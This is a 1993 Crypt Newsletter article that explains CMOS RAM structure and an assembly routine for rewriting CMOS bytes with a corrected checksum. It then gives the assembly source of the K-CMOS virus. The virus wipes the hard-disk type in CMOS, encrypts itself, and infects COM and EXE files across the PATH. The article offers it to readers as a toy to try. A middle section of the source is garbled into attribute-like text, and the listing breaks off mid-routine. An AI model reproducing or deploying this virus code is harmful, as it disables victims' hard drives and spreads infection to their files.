

comment $

                       K-CM”S VIRUS for Crypt Newsletter 20


             In my quest to bring the latest hi-tech computer virus
         toys to you, faithful reader, I have researched one of the
         relatively untouched-by-viruses parts of an AT computer: 
         the CMOS.

             The CMOS (Complementary Metal Oxide Semiconductor) is a
         low power consumption semiconductor where information such as
         the current equipment settings, hard drive type, time and
         date is stored and maintained using a NiCad battery that is
         recharged every time you turn on the computer. (That is why
         it's a good idea to turn on the computer every once in a while
         if you are not using it for long periods. This prevents
         battery discharge and loss of CMOS settings.)

             The CMOS in your computer is changed and set every time
         you run the Setup program that comes with your BIOS (AMI,
         Phoenix), and can be accessed and changed by any program
         running from DOS.

         The AT CMOS RAM is divided into three areas:

         1 - The clock/calendar bytes
         2 - The control registers
         3 - General purpose RAM.

         The following table  describes the CMOS RAM location and what
         each byte is used for:

OFFSET byte    DESCRIPTION

Real Clock Data

00        Current second in BCD
01        Alarm second in BCD
02        Current minute in BCD
03        Alarm minute in BCD
04        Current Hour in BCD
05        Alarm Hour in BCD
06        Current day of week in BCD
07        Current day in BCD
08        Current month in BCD
09        Current year in BCD

Status Registers

0A        Status Register A
0B        Status Register B
0C        Status Register C
0D        Status Register D

Configuration Data

0E         Diagnostic Status
                          Bit 7 - Clock Lost Power
                          Bit 6 - Bad CMOS checksum
                          Bit 5 - invalid config info at POST
                          Bit 4 - memory Size compare error at POST
                          Bit 3 - Fixed disk or adapter failed initialization
                          Bit 2 - Invalid CMOS time
                          Bits 1-0 - Reserved
0F         Reason for Shutdown
                          00 - Power on or reset
                          01 - Memory Size pass
                          02 - Memory test pass
                          03 - memory test fail
                          04 - POST end: boot system
                          05 - jmp doubleword pointer with EOI
                          06 - Protected tests pass
                          07 - Protected tests fail
                          08 - Memory size fail
                          09 - INT 15h Block move
                          0A - JMP double word pointer without EOI
10         Diskette Drive Types
                          Bits 7-4  - Diskette drive 0 type
                          Bits 3-0  - Diskette drive 1 type
                              0000b - no drive
                              0001b - 360K drive
                              0010b - 1.2MB drive
                              0011b - 720K drive
                              0100b - 1.44 MB drive
                              0101b - 2.88 MB drive
11         Reserved
12         Fixed Disk Drive Types
                          Bits 7-4  - Fixed Disk drive 0 type
                          Bits 3-0  - Fixed Disk drive 1 type
                              0000b - no drive
                          (Note: These drives do not necessarily
                           correspond with the values stored at
                           locations 19h and 1Ah)
13         Reserved
14         Equipment Installed
                          Bits 7-6  - # of Diskette drives
                                00b - 1 diskette drive
                                01b - 2 diskette drives
                          Bits 5-4  - Primary Display
                                00b - reserved
                                01b - 40 X 25 color
                                10b - 80 X 25 color
                                11b - 80 X 25 monochrome
                          Bits 3-0  - Reserved
15         Base Memory in 1K low byte
16         Base Memory in 1K high byte
17         Expansion Memory size low byte
18         Expansion Memory size high byte
19         Fixed Disk Drive Type 0
1A         Fixed Disk Drive Type 1
1B-2D      Reserved
2E         Configuration Data checksum high byte
2F         Configuration Data checksum low byte
30         Actual Expansion Memory size low byte
31         Actual Expansion Memory size high byte
32         Century in BCD
33         Information Flag
                          Bit 7 - 128 Kbyte expanded
                          Bit 6 - Setup Flag
                          Bits 5-0 - Reserved
34-3F      Reserved



             As you can see, there are a total of 63 (3F hex) bytes of
         CMOS RAM, with 33 bytes used as 'reserved' memory in the
         three areas;  these locations are not currently defined by
         the AT BIOS and might be used to store data that will be
         restored after power is shut down.

         The 4 status registers (A through D) located, appropriately, at
         locations 0Ah through 0Dh define the chips operating
         parameters and provide information about interrupts and the
         state of the real time clock chip (RTC).

         With very few restrictions all CMOS RAM locations may be
         directly accessed by an application.
         
         Program locations 11h, 13h, and 1Bh through 2Dh are used
         in calculating the CMOS checksum that the BIOS stores at
         locations 2Eh and 2Fh.
         
         Note: If a program changes ANY bytes at locations 10h 
         through 2Dh it must also recalculate the checksum and store 
         the new value.  Changing these bytes (10h -> 2Dh) without 
         correcting the checksum results in a 'CMOS checksum error' 
         forcing you to run the BIOS setup and reenter all of the CMOS
         information.
         
         The reserved memory locations 34h through 3Fh are not used in
         checksum calculations and may be changed with extreme caution
         since different BIOS versions, manufacturers and hardware
         configurations use this reserved CMOS RAM locations for
         extended system setup information including BIOS passwords
         and DMA settings.


         To access and change a computer's CMOS RAM is very simple:

         Access is done through ports 70 hex (CMOS control/address)
         and port 71 hex (CMOS data).

         The process is thus:

         1 - We specify the CMOS RAM address of the byte we want to
             read or write using port 70h

         EXAMPLE:

         mov  al,XX   where XX = byte specifying the address (00h->3Fh)
         out  70h,al

         2 - We read or write a byte to the address specified in step
             1.

         READ EXAMPLE:

         in  al,71h   byte at location XX goes into AL

         WRITE EXAMPLE:

         out  71h,al  byte in AL goes to location XX in the CMOS RAM

         There is one little problem: if we are writing to any of the
         locations that are checksummed (10h through 2Dh), we must
         change the checksum value as well; so we follow steps 1 and 2
         with the checksum values at locations 2Eh and 2Fh, combine
         the bytes into one register and subtract the current byte
         value from the register containing the checksum. Then we add
         the value of the new byte to be put in the CMOS RAM to the
         register that has the checksum, and we write the checksum,
         and the new byte to the CMOS.
         
         While all of this might seem too complicated, I have
         written a mini-CM”S toolkit, a routine that takes the address
         and the new value of the byte to be put in the CMOS, and does
         the dirty work of putting the values and of changing the
         checksum for you.

         Read the code carefully. It will make everything become
         clearer.

;==============================================================================
CMOS_CHCKSM:

; INPUT:
; DL = CMOS ADDRESS of BYTE TO be MODiFiED
; BL = NEW BYTE VALUE to be PUT IN CMOS RAM

; OUTPUT:
; None.
; REGISTERS USED: AX,CX,BX,DX

;*************************
; GET CMOS Checksum => CX
;*************************

        xor     ax,ax
        mov     al,2Eh           ;msb of checksum address
        out     70h,al           ;send address / control byte
        in      al,71h           ;read byte

        xchg    ch,al            ;store al in ch

        mov     al,2Fh           ;lsb of checksum address
        out     70h,al           ;send address / control byte
        in      al,71h           ;read byte

        xchg    cl,al            ;store lsb to cl

;*********************
; Fix CMOS Checksum
;*********************

        push    dx
        xchg    dl,al           ;AL = address
        out     70h,al          ;send address / control byte
        in      al,71h          ;read register

        sub     cx,ax           ;subtract from checksum

        add     cx,bx           ;update checksum value in register.

;****************************
; Write CMOS byte to Address
;****************************

        pop     dx
        xchg    dl,al           ;AL = address
        out     70h,al          ;specify CMOS address
        xchg    al,bl           ;new CMOS value => al

        out     71h,al          ;write new CMOS byte

;*********************
; Write CMOS Checksum
;*********************

        mov     al,2Eh          ;address of checksum 's msb
        out     70h,al          ;specify CMOS address
        xchg    al,ch           ;msb of new checksum

        out     71h,al          ;write new CMOS msb

        mov     al,2Fh          ;address of checksum 's lsb
        out     70h,al          ;specify CMOS address
        xchg    al,cl           ;lsb of new checksum

        out     71h,al          ;write new CMOS lsb
        ret

;==============================================================================


             It is worth mentioning that for XT (8088) type computers
         the CMOS routine will have no adverse effects in the
         execution of the virus-infected program.

             There are many intriguing features of CMOS-attacking 
         viruses: The biggest one is the interaction between software
         and CMOS is not stopped by common anti-virus memory
         resident programs. The most talked about example of such
         a virus is the South African EXEbug, which uses CMOS
         manipulation to make itself difficult to remove from an
         infected hard disk. EXEbug massages the CMOS so that if
         the machine is booted from a diskette and the virus is
         not in memory, the infected hard disk is not recognized.

         The list of possible problems created by a CMOS
         attacking virus is long:

         1 - CMOS checksum errors.
         This will force the user to reenter all of the CMOS data.
         Change any value in the correct CMOS range without
         updating the checksum.

         2 - Dead disk / hard drives.
         This could drive the uninformed to presume they have
         encountered a hardware problem.

         3 - Changed hardrive types, horrendous hardrive problems.
         For example: Input the hardrive type byte, subtract some small
         digit from it and output the byte to the CMOS. (The checksum
         must be fixed!) and a horrible mess results on subsequent
         boot up.

         4 - Changed dates, times, etc.
         The uninformed could thing the Nicad battery has died,
         or that his/her computer is possessed by evil, Nigerian
         Deities.

         5 - Changed BIOS passwords, inability to access a computer.
         On newer AMI BIOSes you can set or change the password
         required to access the computer.  This topic was discussed
         briefly in a recent issue of Virus News International, the 
         upshot being that the unsuspecting could be flummoxed into
         throwing the computer out the window, or more realistically,
         calling a technician. In the case where some knowledge about 
         computers is present, the case is opened and the jumper
         found to short the CMOS. (No, you don't have to disconnect 
         the battery.  And you didn't throw out your machine manuals
         did you?)

             Although many anti-virus programs can save and restore
         your CMOS values as part of their function, currently there 
         is only one memory resident program that checks for changes 
         in the CMOS: Thunderbyte's TBMEM.

             This month's example, K-CM”S, falls in category #2: it
         kills all fixed disk drives by zeroing out location 12h in
         the CMOS RAM. It also has some encryption abilities (a 16
         byte constant decryptor) and a PATH style infection routine
         that actually works!
         
         Needless to say, careful handling is necessary as it can
         spread quite rapidly.

         Important: Since K-CMOS zero's the CMOS value for the fixed
         disk on execution, unless you restore the value before ending
         your experiment with some software CMOS reloading tool, you
         will have a dead C: drive when you finally get around to
         rebooting.  Keep in mind that if you don't know how to reset
         your CMOS on power up using the built in BIOS setup, you will
         sit there in a dumb stew wondering why you ran a virus which
         unhooked your hard drive.

         To prevent this from happening, you must familiarize yourself
         with the BIOS setup program. Here is a brief walkthrough which
         could be used to properly restore your machine after K-CMOS
         has altered your CMOS:
         
         1 - BEFORE you execute K-CMOS - on power up, bring up your 
         BIOS setup by holding down the DEL key while you are booting 
         the computer. 
         
         2 - You will probably see a screen with a number of selections.
         You will want to bring up "Change Basic CMOS Settings" or its
         equivalent. Write down the values for the HD types on drives 
         C and D.

         3- IF the hard drive types are "47" the you MUST record all 
         of the data in the displayed fields, i.e, the information 
         such as the number of heads, sectors, etc. Again, you MUST 
         do this BEFORE you run K-CMOS or you will have to look in 
         your manuals somewhere to get the specific HD information!

         NOTE: Newer AMI BIOSes have an auto-detect feature in the 
         Setup menu, so you might not have to worry about hard disk type 
         number, number of sectors, number of heads, etc., if you have 
         the feature in your computer's BIOS. The setup will do the 
         work for you.

         4 - Now that you've recorded this data, you can test K-CMOS
         and watch it unhook your system.  On reboot, you will lose the
         hard disk.  Reboot, bring up your Setup program as above, re-
         enter the values for the hard disk which you previously 
         recorded, exit and save.  You are back in business.

         Enjoy!

$

;=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-
;                                K-CM”S.ASM
;                            AUTHOR:  K”hntark
;                           DATE:    November 93
;                           Size: < 1100="" bytes="" ;="" ;="-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-" main="" segment="" byte="" assume="" cs:main,ds:main,ss:nothing="" ;all="" part="" in="" one="" segment="com" file="" org="" 100h="" ;**********************************="" ;="" fake="" host="" program="" ;**********************************="" host:="" db="" 0e9h,0ah,00="" ;jmp="" near="" ptr="" virus="" db="" '="" '="" db="" 90h,90h,90h="" mov="" ah,4ch="" mov="" al,0="" int="" 21h="" ;terminate="" normally="" with="" dos="" ;ííííííííííííííííííííííííííííííííííííííííííííííííííííííííííííííííííííííííííííí="" ;**********************************="" ;="" virus="" code="" starts="" here="" ;**********************************="" virus:="" mov="" si,010dh="" ;get="" starting="" address="" ;************************************="" ;="" fix="" ds="" es="" ;************************************="" mov="" al,cs:byte="" ptr="" [si="" +="" com_flag="" -="" virus]="" ;save="" com/exe="" flag="" in="" ax="" mov="" word="" ptr="" cs:[si="" +="" psp_seg="" -="" virus],es="" ;save="" psp="" segment="" for="" use="" in="" path="" search="" push="" ax="" ;save="" com/exe="" flag="" push="" es="" ;save="" es="" and="" ds="" in="" case="" file="" is="" exe="" push="" ds="" push="" cs="" push="" cs="" pop="" es="" ;es="cs" pop="" ds="" ;ds="cs" push="" word="" ptr="" [si="" +="" orig_ipcs="" -="" virus]="" ;save="" ip="" push="" word="" ptr="" [si="" +="" orig_ipcs="" -="" virus="" +="" 2]="" ;save="" cs="" push="" word="" ptr="" [si="" +="" orig_sssp="" -="" virus]="" ;save="" ss="" push="" word="" ptr="" [si="" +="" orig_sssp="" -="" virus="" +="" 2]="" ;save="" sp="" push="" word="" ptr="" [si="" +="" start_code="" -="" virus]="" push="" word="" ptr="" [si="" +="" start_code="" -="" virus="" +="" 2]="" ;************************************="" ;="" redirect="" dta="" onto="" virus="" code="" ;************************************="" lea="" dx,[si="" +="" dta="" -="" virus]="" ;put="" dta="" at="" the="" end="" of="" the="" virus="" for="" now="" mov="" ah,1ah="" ;set="" new="" dta="" function="" to="" ds:dx="" int="" 21h="" ;************************************="" ;="" kill="" fixed="" disk="" drives="" in="" cmos="" ;************************************="" mov="" dx,0012h="" ;hard="" drive="" type="" register="" xor="" bx,bx="" ;new="" hard="" drive="" type="0" (no="" fixed="" drive)="" call="" cmos_chcksm="" ;************************************="" ;="" main="" routines="" called="" from="" here="" ;************************************="" lea="" bp,[si="" +="" com_mask="" -="" virus]="" call="" find_file="" ;get="" a="" com="" file="" to="" attack!="" lea="" bp,[si="" +="" exe_mask="" -="" virus]="" call="" find_file="" ;get="" an="" exe="" file="" to="" attack!="" ;ííííííííííííííííííííííííííííííííííííííííííííííííííííííííííííííííííííííííííííí="" exit_virus:="" ;************************************="" ;="" set="" old="" dta="" address="" ;************************************="" mov="" ah,1ah="" mov="" dx,80h="" ;fix="" dta="" back="" to="" ds:dx="" int="" 21h="" ;host="" program="" pop="" word="" ptr="" [si="" +="" start_code="" -="" virus="" +="" 2]="" pop="" word="" ptr="" [si="" +="" start_code="" -="" virus]="" cli="" pop="" word="" ptr="" [si="" +="" orig_sssp="" -="" virus="" +="" 2]="" ;save="" sp="" pop="" word="" ptr="" [si="" +="" orig_sssp="" -="" virus]="" ;save="" ss="" sti="" pop="" word="" ptr="" [si="" +="" orig_ipcs="" -="" virus="" +="" 2]="" ;save="" cs="" pop="" word="" ptr="" [si="" +="" orig_ipcs="" -="" virus]="" ;save="" ip="" pop="" ds="" ;restore="" ds="" pop="" es="" ;restore="" es="" pop="" ax="" ;restore="" com_flag="" cmp="" al,00="" ;com="" infection?="" je="" restore_com="" ;************************************="" ;="" restore="" exe..="" and="" exit..="" ;************************************="" mov="" bx,ds="" ;ds="" has="" to="" be="" original="" one="" add="" bx,low="" 10h="" mov="" cx,bx="" add="" bx,cs:word="" ptr="" [si="" +="" orig_sssp="" -="" virus]="" ;restore="" ss="" cli="" mov="" ss,bx="" mov="" sp,cs:word="" ptr="" [si="" +="" orig_sssp="" -="" virus="" +="" 2]="" ;restore="" sp="" sti="" add="" cx,cs:word="" ptr="" [si="" +="" orig_ipcs="" -="" virus+="" 2]="" push="" cx="" ;push="" cs="" push="" cs:word="" ptr="" [si="" +="" orig_ipcs="" -="" virus]="" ;push="" ip="" db="" 0cbh="" ;retf="" ;************************************="" ;="" restore="" 4="" original="" bytes="" to="" file="" ;************************************="" restore_com:="" push="" si="" ;save="" si="" cld="" ;clear="" direction="" flag="" add="" si,offset="" start_code="" -="" offset="" virus="" ;source:="" ds:si="" mov="" di,0100h="" ;destination:="" es:di="" movsw="" ;shorter="" &="" faster="" than="" movsw="" ;mov="" cx,04="" and="" rep="" movsb="" pop="" si="" ;restore="" si="" ;****************************************************************="" ;="" zero="" out="" registers="" for="" return="" to="" ;="" host="" program="" ;****************************************************************="" mov="" ax,0100h="" ;return="" address="" xor="" bx,bx="" xor="" cx,cx="" xor="" si,si="" xor="" di,di="" push="" ax="" xor="" ax,ax="" cwd="" ret="" ;ííííííííííííííííííííííííííííííííííííííííííííííííííííííííííííííííííííííííííííí="" no_good:="" stc="" jmp="" get_out="" quick_exit:="" stc="" ;set="" carry="" flag="" ret="" ;-----------------------------------------------------------------------------="" check_n_infect_file:="" ;******************="" ;="" 1-check="" time="" id="" ;******************="" mov="" cx,word="" ptr="" [si="" +="" dta_file_time="" -="" virus]="" ;file="" time="" from="" dta="" and="" cl,1dh="" ;58="" seconds?="" cmp="" cl,1dh="" je="" quick_exit="" ;*********************************************="" ;="" 2-clear="" attributes="" ;*********************************************="" lea="" dx,[si="" +="" work_area="" -="" virus]="" ;dx="ptr" to="" path="" +="" current="" filename="" xor="" cx,cx="" ;set="" attributes="" to="" normal="" mov="" ax,4301h="" ;set="" file="" attributes="" to="" cx="" int="" 21h="" ;int="" 21h="" jc="" quick_exit="" ;error..="" quit="" ;*****************="" ;="" 3-open="" file="" ;*****************="" mov="" ax,3d02h="" ;r/w="" access="" to="" it="" int="" 21h="" jc="" no_good="" ;error..="" quit="" xchg="" ax,bx="" ;bx="file" handle="" ;********************="" ;="" 4-read="" 1st="" 28="" bytes="" ;********************="" mov="" cx,28d="" ;read="" first="" 5="" bytes="" of="" file="" lea="" dx,[si="" +="" start_code="" -="" virus]="" ;store'em="" here="" mov="" ah,3fh="" ;dos="" read="" function="" int="" 21h="" jc="" no_good="" ;error?="" get="" next="" file="" ;*********************="" ;="" 5-check="" file="" ;*********************="" cmp="" word="" ptr="" [si="" +="" start_code="" -="" virus],'zm'="" ;exe="" file?="" je="" check_exe="" ;no?="" check="" com="" cmp="" word="" ptr="" [si="" +="" start_code="" -="" virus],'mz'="" ;exe="" file?="" je="" check_exe="" ;no?="" check="" com="" check_com:="" mov="" ax,word="" ptr="" [si="" +="" dta_file_size="" -="" virus]="" ;get="" file's="" size="" push="" ax="" ;insert="" new="" entry="" point="" just="" in="" case..="" add="" ax,100h="" +="" decryptor_size="" mov="" word="" ptr="" [si="" +="" 1],ax="" pop="" ax="" add="" ax,offset="" final="" -="" offset="" virus="" ;add="" virus="" size="" to="" it="" jc="" no_good="" ;bigger="" then="" 64k:nogood="" cmp="" byte="" ptr="" [si="" +="" start_code="" -="" virus],0e9h="" ;compare="" 1st="" byte="" to="" near="" jmp="" jne="" short="" infect_com="" ;not="" a="" near="" jmp,="" file="" ok="" cmp="" byte="" ptr="" [si="" +="" start_code+3="" -="" virus],20h="" ;check="" for="" '="" '="" je="" no_good="" ;file="" ok="" ..="" infect="" jmp="" short="" infect_com="" check_exe:="" cmp="" word="" ptr="" [si="" +="" start_code="" -="" virus="" +="" 18h],40h="" ;windows="" file?="" je="" no_good="" ;no?="" check="" com="" cmp="" word="" ptr="" [si="" +="" start_code="" -="" virus="" +="" 01ah],0="" ;internal="" overlay="" jne="" no_good="" ;yes?="" exit..="" cmp="" word="" ptr="" [si="" +="" start_code="" -="" virus="" +="" 12h],id="" ;already="" infected?="" je="" no_good="" infect_exe:="" mov="" byte="" ptr="" [si+="" com_flag="" -="" virus],01="" ;exe="" infection="" jmp="" short="" skip="" infect_com:="" mov="" byte="" ptr="" [si+="" com_flag="" -="" virus],00="" ;com="" infection="" skip:="" ;*********************="" ;="" 6-set="" ptr="" @eof="" ;*********************="" xor="" cx,cx="" ;prepare="" to="" write="" virus="" on="" file="" xor="" dx,dx="" ;position="" file="" pointer,cx:dx="0" ;cwd="" ;position="" file="" pointer,cx:dx="0" mov="" ax,4202h="" int="" 21h="" ;locate="" pointer="" at="" end="" eof="" dos="" function="" ;*********************="" ;="" 7-fix="" decrypttor="" ;*********************="" push="" ax="" ;save="" file="" size="" (com="" file,="" for="" exe="" files="" ;this="" is="" redone="" later)="" add="" ax,100h="" +="" decryptor_size="" mov="" word="" ptr="" [si="" +="" work_buffer="" -="" virus="" +="" 4],ax="" ;insert="" address="" mov="" ax,(offset="" final="" -="" offset="" virus)/2="" ;virus="" size="" in="" words="" mov="" word="" ptr="" [si="" +="" work_buffer="" -="" virus="" +="" 1],ax="" ;insert="" size="" in="" al,40h="" ;get="" a="" random="" word="" in="" ax="" xchg="" ah,al="" in="" al,40h="" xor="" ax,0813ch="" add="" ax,09249h="" rol="" al,1="" ror="" ah,1="" mov="" word="" ptr="" [si="" +="" work_buffer="" -="" virus="" +="" 9],ax="" ;insert="" random="" key="" pop="" ax="" ;restore="" file="" size="" cmp="" byte="" ptr="" [si+="" com_flag="" -="" virus],01="" ;exe="" file?="" jne="" do_com="" ;*************************="" ;="" 8-fix="" and="" write="" exe="" hdr="" ;*************************="" push="" bx="" ;save="" file="" handler="" ;-----------------------="" ;="" save="" cs:ip="" &="" ss:sp="" ;-----------------------="" push="" si="" cld="" ;clear="" direction="" flag="" lea="" di,[si="" +="" orig_sssp="" -="" virus]="" ;save="" original="" cs:ip="" at="" es:di="" lea="" si,[si="" +="" start_code="" -="" virus="" +="" 14d]="" ;from="" ds:si="" movsw="" ;save="" ss="" movsw="" ;save="" sp="" add="" si,02="" ;save="" original="" ss:sp="" movsw="" ;save="" ip="" movsw="" ;save="" cs="" pop="" si="" ;-----------------------------="" ;="" calculate="" new="" cs:ip="" ;-----------------------------="" mov="" bx,word="" ptr[si="" +="" start_code="" -="" virus="" +="" 8]="" ;header="" size="" in="" paragraphs="" mov="" cl,04="" ;multiply="" by="" 16,="" won't="" work="" with="" headers=""> 4096
        shl  bx,cl                                    ;bx=header size

        push ax                                       ;save file size at dx:ax
        push dx

        sub  ax,bx                                    ;file size - header size
        sbb  dx,0000h                                 ;fix dx if carry, assures dx, ip < 16="" call="" calculate="" mov="" word="" ptr="" [si+="" start_code="" -="" virus="" +="" 12h],id="" ;put="" id="" in="" checksum="" slot="" mov="" word="" ptr="" [si+="" start_code="" -="" virus="" +="" 14h],ax="" ;ip="" add="" ax,decryptor_size="" mov="" word="" ptr="" [si+1],ax="" ;insert="" new="" starting="" address="" mov="" word="" ptr="" [si="" +="" work_buffer="" -="" virus="" +="" 4],ax="" ;insert="" address="" on="" decryptor="" mov="" word="" ptr="" [si+="" start_code="" -="" virus="" +="" 16h],dx="" ;cs="" ;-----------------------------="" ;="" calculate="" &="" fix="" new="" ss:sp="" ;-----------------------------="" pop="" dx="" pop="" ax="" ;filelength="" in="" dx:ax="" add="" ax,offset="" final="" -="" offset="" virus="" ;add="" filesize="" to="" ax="" adc="" dx,0000h="" ;fix="" dx="" if="" carry="" push="" ax="" push="" dx="" add="" ax,40h="" ;if="" filesize="" +="" virus="" size="" is="" even="" then="" the="" stack="" size="" test="" al,01="" ;even="" or="" odd="" stack?="" jz="" evenn="" inc="" ax="" ;make="" stack="" even="" evenn:="" call="" calculate="" mov="" word="" ptr="" [si+="" start_code="" -="" virus="" +="" 10h],ax="" ;sp="" mov="" word="" ptr="" [si+="" start_code="" -="" virus="" +="" 0eh],dx="" ;ss="" ;-----------------------------="" ;="" calculate="" new="" file="" size="" ;-----------------------------="" pop="" dx="" pop="" ax="" push="" ax="" mov="" cl,0009h="" ;2^9="512" ror="" dx,cl="" ;/="" 512="" (sort="" of)="" shr="" ax,cl="" ;/="" 512="" stc="" ;set="" carry="" flag="" adc="" dx,ax="" ;fix="" dx="" ,="" page="" count="" pop="" cx="" and="" ch,0001h="" ;mod="" 512="" mov="" word="" ptr="" [si+="" start_code="" -="" virus="" +="" 4],dx="" ;page="" count="" mov="" word="" ptr="" [si+="" start_code="" -="" virus="" +="" 2],cx="" ;save="" remainder="" pop="" bx="" ;restore="" file="" handle="" do_com:="" ;*********************="" ;="" 9-write="" decryptor="" ;*********************="" lea="" dx,[si="" +="" work_buffer="" -="" virus]="" ;write="" from="" here="" mov="" cx,decryptor_size="" ;write="" #="" of="" bytes="" mov="" ah,40h="" ;write="" to="" file="" bx="file" handle="" int="" 21h="" ;write="" from="" ds:dx="" ;*********************="" ;="" 10-encrypt="" virus="" ;*********************="" push="" ds="" ;save="" ds="" push="" es="" ;save="" es="" mov="" ax,0a00h="" ;set="" up="" new="" es="" (work)="" segment="" push="" ax="" pop="" es="" ;es="AX=0A00h" xor="" di,di="" ;di="0" mov="" cx,(offset="" final="" -="" offset="" virus)/2="" ;virus="" size="" cx="#" words="" push="" si="" ;save="" si="" mov="" dx,word="" ptr="" [si="" +="" work_buffer="" -="" virus="" +="" 9]="" ;get="" random="" key="" in="" dx="" encrypt:="" lodsw="" ;word="" ptr="" ds:[si]=""> ax
       sub   ax,dx    ;encrypt ax
       stosw          ;ax => word ptr es:[di]
       loop  enCRYPT

       pop   si       ;restore SI
       xor   dx,dx    ;DX=0
       push  es
       pop   ds       ;DS=ES

;*********************
; 11-Write Virus
;*********************

        mov  cx,OFFSET FINAL - OFFSET VIRUS      ;write virus  cx= # bytes
        mov  ah,40h                              ;write to file bx=file handle
        int  21h                                 ;write from DS:DX

        pop  es                                  ;restore ES
        pop  ds                                  ;restore DS

;*********************
; 12-set PTR @BOF
;*********************

        mov  ax,4200h                            ;locate pointer at beginning of
        xor  cx,cx
        xor  dx,dx                               ;position file pointer,cx:dx = 0
       ;cwd                                      ;position file pointer,cx:dx = 0
        int  21h                                 ;host file

        cmp BYTE PTR [si+ COM_FLAG  - VIRUS],01  ;exe file?
        jne DO_COM2

;*********************
; 13-Write EXE Header
;*********************

        mov  cx,28d                               ;#of bytes to write
        lea  dx,[si + START_CODE - VIRUS]         ;ds:dx=pointer of data to write
        jmp  short CONT

;****************************************************
; 14-write new 4 bytes to beginning of file (COM)
;***************************************************

DO_COM2:
        mov  ax,WORD PTR [si + DTA_File_SIZE - VIRUS]
        sub  ax,3
        mov  WORD PTR [si + START_IMAGE + 1 - VIRUS],ax

        mov  cx,4                                 ;#of bytes to write
        lea  dx,[si + START_IMAGE - VIRUS]        ;ds:dx=pointer of data to write

CONT:
        mov  ah,40h                               ;DOS write function
        int  21h                                  ;write 5 / 28 bytes

;*************************************************
; 15-Restore date and time of file to be infected
;*************************************************

        mov  ax,5701h
        mov  dx,WORD PTR [si + DTA_File_DATE - VIRUS]
        mov  cx,WORD PTR [si + DTA_File_TIME - VIRUS]
        and  cx,0FFE0h                             ;mask all but seconds
        or   cl,1Dh                                ;seconds to 58
        int  21h

GET_OUT:
;****************
; 16-Close File
;****************

        pushf                          ;save flags to return on exit
        mov  ah,3Eh
        int  21h                       ;close file

;*************************************************
; 17-Restore file's attributes
;*************************************************

       mov ax,4301h                                  ;set file attributes to cx
       lea dx,[si + WORK_AREA - VIRUS]               ;dx=ptr to path + current filename
       xor cx,cx
       mov cl,BYTE PTR [si + DTA_File_ATTR - VIRUS]  ;get old attributes
       int 21h
       popf                                          ;restore flags to return on exit
       ret                                           ;infection done!

;ÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ

CALCULATE:
        mov cl,0Ch
        shl dx,cl     ;dx * 4096
        mov bx,ax
        mov cl,4
        shr bx,cl     ;ax / 16
        add dx,bx     ;dx = dx * 4096 + ax / 16 =SS CS
        and ax,0Fh    ;ax = ax and 0Fh          =SP IP
        ret

;ÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ

FIND_FILE:
             push  si
             push  es
             mov   es,es:WORD PTR [si + PSP_SEG - VIRUS] ;es=saved PSP segment
             mov   es,es:2ch                             ;es:di points to environment
             xor   di,di
             mov   bx,si
FIND_PATH:
            lea   si,[bx + PATH_STR - VIRUS]  ;source :ds:si = 'P'
            lodsb                             ;load 'P'
            mov   cx,7FFFh                    ;size of environment= 32768 bytes
            not   cx                          ;cx=8000h
            repne scasb                       ;find 'P' in es:di
            mov cx,4

CHECK_NEXT_4:
               lodsb                   ;check for 'ATH'
               scasb
               jne  FIND_PATH
               loop CHECK_NEXT_4

               mov WORD PTR [bx + PATH_ADDRESS - VIRUS],di            ;save path's address es:di
               lea di,[bx + WORK_AREA - VIRUS]
               pop es                                                 ;restore PSP segment
               jmp short COPY_FILE_SPEC_TO_WORK_AREA

NO_FILE_FOUND:
                cmp word ptr [bx + PATH_ADDRESS - VIRUS],0 ;has path string ended?
                jne FOLLOW_THE_PATH                        ;if not there are more subdirs
                jmp EXIT                                   ;path string ended.. exit

FOLLOW_THE_PATH:
                 lea di,[bx + WORK_AREA - VIRUS]              ;destination es:di = work area
                 mov si,WORD PTR [bx + PATH_ADDRESS - VIRUS]  ;source      ds:si = Environment
                 mov ds,WORD PTR [bx + PSP_SEG - VIRUS]       ;ds=PSP segment
                 mov ds,ds:2ch                                ;ds:si points to environment

UP_TO_LODSB:
                 lodsb                               ;get character
                 xchg cx,ax                          ;he he
                 cmp cl,';'                          ;is it a ';'?
                 xchg cx,ax                          ;he he
                 je SEARCH_AGAIN
                 cmp al,0                            ;end of path string?
                 je CLEAR_SI
                 stosb                               ;save path marker into di
                 jmp SHORT UP_TO_LODSB

CLEAR_SI:        ;mark the fact that we are looking thru the final subdir
                  xor si,si

SEARCH_AGAIN:
                  mov WORD PTR cs:[bx + PATH_ADDRESS - VIRUS],si ;save address of next subdir
                  cmp BYTE PTR cs:[di-1],'\'                     ;ends with a '\'?
                  je COPY_FILE_SPEC_TO_WORK_AREA
                  mov al,'\'                                     ;add '\' if not
                  stosb

;***********************************************
; put *.COM / *.EXE into workspace
;***********************************************

COPY_FILE_SPEC_TO_WORK_AREA:
                  push cs
                  pop  ds                                      ;ds=cs
                  mov  WORD PTR [bx + FILENAME_PTR - VIRUS],di ;es:di = WORK_AREA
                  mov  si,bp                                   ;bp=file spec
                  mov  cx,3                                    ;length of *.com0/ *.EXE0
                  rep  movsw                                   ;move *.COM0/ *.EXE0 to workspace

;************************************************
; Find FIRST FILE
;************************************************

                  mov ah,04EH                     ;DOS function
                  lea dx,[bx + WORK_AREA - VIRUS] ;dx points to path in workspace
                  mov cx,3Fh                      ;attributes RO or hidden OK
FIND_NEXT_FILE:   int 21H
                  jnc FILE_FOUND
                  jmp short NO_FILE_FOUND

FILE_FOUND:
             mov di,WORD PTR [bx + FILENAME_PTR - VIRUS] ;destination: es:di
             lea si,[bx + DTA_File_NAME - VIRUS]         ;origin       ds:si

MOVE_ASCII_FILENAME:
                      lodsb                    ;move filename to the end of path
                      stosb
